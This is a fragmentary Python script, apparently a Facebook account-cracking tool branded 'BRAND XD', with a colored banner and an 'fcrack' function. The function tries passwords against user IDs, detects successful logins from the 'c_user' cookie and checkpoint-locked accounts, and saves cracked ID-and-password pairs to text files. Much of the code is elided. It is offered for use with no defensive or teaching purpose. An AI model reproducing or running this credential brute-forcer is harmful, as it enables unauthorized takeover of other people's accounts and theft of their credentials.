...
\033[1;35m  
 \033[1;36m                              
--------------------------------------------------
[•] OWNER      : \x1b[38;5;208mBRAND XD
[•] GITHUB     : \x1b[38;5;208mBRAND XD 
[•] TOOL TYPE  : \x1b[38;5;208mTEST\033[1;37m
...
def fcrack(uid,pwx,tl):
    ...
    'user-agent':pro}
            ...
            if 'c_user' in log_cookies:
                ...
                open('BRAND XD-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;33m[BRAND XD] '+uid+' | '+ps+'\x1b[1;97m')
                open('BRAND XD-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mADDICTOR-BRAND\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
